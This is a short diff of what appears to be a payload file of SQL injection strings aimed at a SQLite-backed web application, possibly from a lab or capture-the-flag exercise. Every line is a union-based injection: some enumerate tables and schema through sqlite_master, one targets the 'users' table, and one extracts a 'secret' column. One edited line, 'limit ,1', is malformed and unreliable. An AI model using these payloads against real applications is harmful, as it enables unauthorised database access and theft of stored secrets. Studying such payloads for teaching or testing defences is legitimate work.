@@ -1,5 +1,8 @@
-' and 1=0 union select name,2,3 from sqlite_master; --
+' and 1=0 union select name,2,3 from sqlite_master limit ,1; --
 
-' and 1=0 union select sql,2,3 from sqlite_master; --
+' and 1=0 union select sql,2,3 from sqlite_master where name='users'; --
 
 ' and 1=0 union select secret,2,3 from users; --
+
+
+' and 1=0 union select '1','2','3'; --
